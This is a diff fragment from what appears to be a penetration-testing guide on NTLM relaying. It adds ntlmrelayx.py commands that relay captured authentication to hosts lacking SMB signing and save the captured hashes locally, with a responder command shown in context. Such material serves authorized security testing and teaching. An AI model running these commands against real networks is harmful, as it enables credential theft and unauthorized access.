@@ -57,7 +57,11 @@ responder -I eth0 -dwP
 We can then run `ntlmrelayx.py` from Impacket, supplying our file of hosts previously identified to have SMB Signing Disabled.
 
 ```bash
+# Example generic relaying
 python3 ntlmrelayx.py -tf smbdisabled.out --smb2-support
+
+# Save hashes from relaying locally
+python3 ntlmrelayx.py -tf smbdisabled.out --smb2-support -of
 ```
 
 #### Relaying with SOCKS
